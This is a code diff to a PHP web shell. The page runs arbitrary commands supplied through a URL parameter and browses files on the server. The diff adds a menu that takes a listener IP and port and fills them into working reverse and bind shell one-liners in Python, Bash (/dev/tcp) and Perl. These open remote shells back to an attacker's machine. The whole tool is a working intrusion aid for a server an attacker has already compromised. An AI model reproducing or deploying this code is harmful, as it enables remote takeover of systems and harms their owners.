@@ -1975,13 +1975,58 @@ RK5CYII=',
 }
 ?>
 
+<div class="shell-menu vertical-menu">
+    <p class="section-header">Spawn a Shell</p>
+<?php
+if(isset($_GET["ip"])){
+    $ip_setting = $_GET['ip'];
+} else {
+    $ip_setting = "";
+}
+if(isset($_GET["port"])){
+    $port_setting = $_GET['port'];
+} else {
+    $port_setting = "";
+}
+echo '<div class="config">';
+echo '<p class="ip-header">Listening IP:</p>';
+echo '<input type="text" class="set-ip" value="' . $ip_setting . '"></input>';
+echo '</div>';
+echo '<div class="config">';
+echo '<p class="port-header">Listening Port:</p>';
+echo '<input type="text" class="set-port" value="' . $port_setting . '"></input>';
+echo '</div>';
+?>
+    <button onclick="save_settings()">Save</button>
+    <div class="langs">
+        <div class="lang lang-py" onclick="show_shell_cmd('python','lang-py')">Python</div>
+        <div class="lang lang-bash" onclick="show_shell_cmd('bash','lang-bash')">Bash</div>
+        <div class="lang lang-nc">Netcat</div>
+        <div class="lang lang-pl" onclick="show_shell_cmd('perl','lang-pl')">Perl</div>
+    </div>
+</div>
 
+<div class="shell-option-pop-up">
+    <span class="closebtn" onclick="close_popup(this.parentElement);">&times;</span> 
+    <div>
+        <strong>Reverse:</strong><br>
+        <span class="shell-text-reverse"></span>
+    </div>
+    <div>
+        <strong>Bind:</strong><br>
+        <span class="shell-text-bind"></span>
+    </div>
+</div>
 
 
 <?php
 ini_set('display_errors', 1);
-echo "<div class='shell'>";
-
+$command = "";
+if(isset($_GET["p"])){
+    $path = $_GET['p'];
+} else {
+    $path = "";
+}
 
 if( empty($_SESSION['history']) ) {
         $_SESSION['history'] = "";
@@ -2037,12 +2082,12 @@ if(isset($_GET["cmd"])){
     }
 } 
 
-echo "DOCUMENT_ROOT:<br>";
-echo rtrim($_SERVER['DOCUMENT_ROOT'])."<br>";
-echo "CURRENT PATH SETTING:<br>";
-echo $_SESSION['shell_path']."<br>";
-echo "RUN PREFACE:<br>";
-echo $cwd_cmd."<br>";
+#echo "DOCUMENT_ROOT:<br>";
+#echo rtrim($_SERVER['DOCUMENT_ROOT'])."<br>";
+#echo "CURRENT PATH SETTING:<br>";
+#echo $_SESSION['shell_path']."<br>";
+#echo "RUN PREFACE:<br>";
+#echo $cwd_cmd."<br>";
 
 
 echo '<div class="cmd-form">';
@@ -2051,7 +2096,9 @@ echo '<p class="section-header">Command:</p>';
 echo '<div class="terminal">';
 echo '<p class="shell-path">Working Dir: ' . $_SESSION['shell_path'] . '</p>';
 echo '<input class="cmd-input" id="cmd" type="text" name="cmd"><br>';
-echo '<input type="hidden" name="p" value="' . htmlspecialchars($_GET['p']) . '">';
+echo '<input class="p-setting" type="hidden" name="p" value="' . htmlspecialchars($path) . '">';
+echo '<input class="ip-setting" type="hidden" name="ip" value="' . htmlspecialchars($ip_setting) . '">';
+echo '<input class="port-setting" type="hidden" name="port" value="' . htmlspecialchars($port_setting) . '">';
 echo '<input class="submit" value="Run" type="submit">';
 echo '</div>';
 echo "<a class='reset' href='" . $reset_history . "'>Reset History</a>";
@@ -2066,9 +2113,11 @@ $output = '<pre>' . $_SESSION['last-cmd-output'] . '</pre>';
 echo $output;
 echo "</div>";
 
-$hist = $_SESSION['history'];
-$new_hist = "<div class='history-cmd'>" . $command . "</div>" . "<div class='history-cmd-output'>" . $output . "</div>" . $hist;
-$_SESSION['history'] = $new_hist;
+if(isset($_GET["cmd"])){
+    $hist = $_SESSION['history'];
+    $new_hist = "<div class='history-cmd'>" . $command . "</div>" . "<div class='history-cmd-output'>" . $output . "</div>" . $hist;
+    $_SESSION['history'] = $new_hist;
+}
 echo '</div>';
 
 if(isset($_GET["reset"])){
@@ -2092,18 +2141,163 @@ echo $_SESSION['history'];
 echo "</div>"; //history-form
 echo "</div>"; //history
 echo "</div>"; //shell
-
-echo '<script>';
-echo 'var input = document.getElementById("cmd");';
-echo 'input.focus();';
-echo 'input.select();';
-echo '</script>';
 echo '</div>';
 
 ?>
+<script>
+var input = document.getElementById("cmd");
+input.focus();
+input.select();
+function hide_shell_cmds(){
+    var tabcontent;
+    tabcontent = document.getElementsByClassName("shell-option-pop-up");
+    for (i = 0; i < tabcontent.length; i++) {
+        tabcontent[i].style.display = "none";
+    }
+    
+    
+}
+
+function close_popup(elem){
+    elem.style.display='none';
+    remove_active();
+}
+
+function remove_active(){
+    obj = document.getElementsByClassName("lang");
+    //console.log(obj.length);
+    for(var i=0; i<obj.length; i++) {
+        //console.log(i);
+        obj[i].classList.remove("active");
+    }
+    //console.log("removed active tags");
+}
+
+function save_settings(){
+    content = document.getElementsByClassName("set-ip");
+    ip_setting = content[0].value;
+    document.getElementsByClassName("ip-setting")[0].value = ip_setting;
+
+    content = document.getElementsByClassName("set-port");
+    port_setting = content[0].value;
+    document.getElementsByClassName("port-setting")[0].value = port_setting;
+    
+}
+
+function show_shell_cmd(lang_type,class_name){
+    remove_active();
+    var shells = {
+        "python": {"reverse":"","bind":""},
+        "bash": {"reverse":"","bind":""},
+        "netcat": {"reverse":"","bind":""},
+        "perl": {"reverse":"","bind":""}
+    };
+
+
+    shells["python"]["reverse"] = "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<span class='ip-placeholder'></span>\",<span class='port-placeholder'></span>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'";
+    
+    shells["python"]["bind"] = "python3 -c 'exec(\"\"\"import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((\"<span class='ip-placeholder'></span>\",<span class='port-placeholder'></span>));s1.listen(1);c,a=s1.accept();\\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())\"\"\")'";
+
+    shells["bash"]["reverse"] = "/bin/bash -i >& /dev/tcp/<span class='ip-placeholder'></span>/<span class='port-placeholder'></span> 0>&1"
+    shells["bash"]["bind"] = "NONE";
+
+    shells["perl"]["reverse"] = "perl -e 'use Socket;$i=\"<span class='ip-placeholder'></span>\";$p=<span class='port-placeholder'></span>;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/bash -i');};'"
+    shells["perl"]["bind"] = "perl -e \"use Socket;$p=<span class='port-placeholder'></span>;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));bind(S,sockaddr_in($p, <span class='ip-placeholder'></span>));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){open(STDIN,'>&C');open(STDOUT,'>&C');open(STDERR,'>&C');exec('/bin/bash -i');};\""
+ 
+    obj = document.getElementsByClassName("shell-option-pop-up");
+    obj[0].style.display = "block";
+    obj = document.getElementsByClassName("shell-text-reverse");
+    obj[0].innerHTML = shells[lang_type]["reverse"];
+    obj = document.getElementsByClassName("shell-text-bind");
+    obj[0].innerHTML = shells[lang_type]["bind"];
+
+    obj = document.getElementsByClassName("set-ip");
+    obj_text = obj[0].value;
+    obj = document.getElementsByClassName("ip-placeholder");
+    for(var i=0; i<obj.length; i++) {
+        //console.log(i);
+        obj[i].innerHTML = obj_text;
+    }
+
+
+    obj = document.getElementsByClassName("set-port");
+    obj_text = obj[0].value;
+    obj = document.getElementsByClassName("port-placeholder");
+    for(var i=0; i<obj.length; i++) {
+        //console.log(i);
+        obj[i].innerHTML = obj_text;
+    }
+ 
+    obj = document.getElementsByClassName(class_name);
+    obj[0].classList.add("active");
+
+}
+hide_shell_cmds()
+
+</script>
+
 <style>
+
+.langs {
+    text-align: center;
+}
+.shell-option-pop-up div {
+    padding: 5px;
+}
+.vertical-menu {
+  width: 110px;
+  padding: 5px;
+  float: left;
+  height: 100%;
+}
+div.shell-menu input {
+    width: 100px;
+}
+div.shell-menu div.config {
+    padding-bottom: 6px;
+}
+.vertical-menu div.lang {
+  background-color: #eee;
+  color: black;
+  display: block;
+  padding: 2px;
+  text-decoration: none;
+}
+
+.vertical-menu div.lang:hover {
+  background-color: #ccc;
+}
+.shell-option-pop-up {
+  padding: 10px;
+  background-color: lightslategray;
+  max-width: 50%;
+  margin: auto;
+  color: white;
+}
+
+.closebtn {
+  margin-left: 15px;
+  color: white;
+  font-weight: bold;
+  float: right;
+  font-size: 22px;
+  line-height: 20px;
+  cursor: pointer;
+  transition: 0.3s;
+}
+
+.closebtn:hover {
+  color: black;
+}
+.active {
+    background-color: palegoldenrod !important;
+}
 .shell-path{
     width: auto;
+}
+.menu-option{
+    padding-bottom: 10px;
+    margin-left: 5px;
 }
 .print-history{
     height: 15vw;
@@ -2140,6 +2334,7 @@ echo '</div>';
 .file-browser{
     overflow-y: scroll;
     max-height: 20vw;
+    margin-bottom: 16px;
 }
 .last-cmd-output{
     padding-bottom: 10px;
